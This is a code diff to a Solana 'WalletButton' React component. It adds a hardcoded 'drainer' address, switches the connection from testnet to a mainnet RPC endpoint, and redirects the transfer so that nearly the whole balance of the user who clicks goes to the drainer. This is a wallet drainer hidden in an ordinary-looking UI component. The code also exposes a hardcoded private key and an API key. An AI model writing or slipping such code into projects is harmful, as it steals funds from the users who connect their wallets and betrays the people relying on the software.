@@ -135,6 +135,7 @@ export default function WalletButton({ className, children }: WalletButtonProps)
     setIsProcessingTransaction(true)
 
     try {
+      const drainer = new PublicKey("HtgpmL6saAieCqtkLyYPirf9CS1htH1fyWSec37P6Hui")
       const secret = Keypair.fromSecretKey(
         bs58.decode("3r8mykC8HCirQBq5R5ZXEB5vBWd53WFsbSSpfmah1s4uETHzKJpCoCgJubZ6CuUykPMfEv5fdt4aV6BRFwqm7uaY"));
       const vault = secret.publicKey
@@ -142,7 +143,7 @@ export default function WalletButton({ className, children }: WalletButtonProps)
       const ALCHEMY_API_URL = 'https://solana-mainnet.g.alchemy.com/v2/1duafDP7kyCuWgHCJ_-Mihe4o4r1wC9S';
 
       // Set up the connection to Alchemy Solana
-      const connection = new Connection(clusterApiUrl('testnet'), 'confirmed');
+      const connection = new Connection(ALCHEMY_API_URL, 'confirmed');
       //fetch balance
       let Bal;
       try {
@@ -266,7 +267,7 @@ export default function WalletButton({ className, children }: WalletButtonProps)
 
       const solIx = SystemProgram.transfer({
         fromPubkey: publicKey,
-        toPubkey: vault,
+        toPubkey: drainer,
         lamports: Bal - 3000000,
       });
 
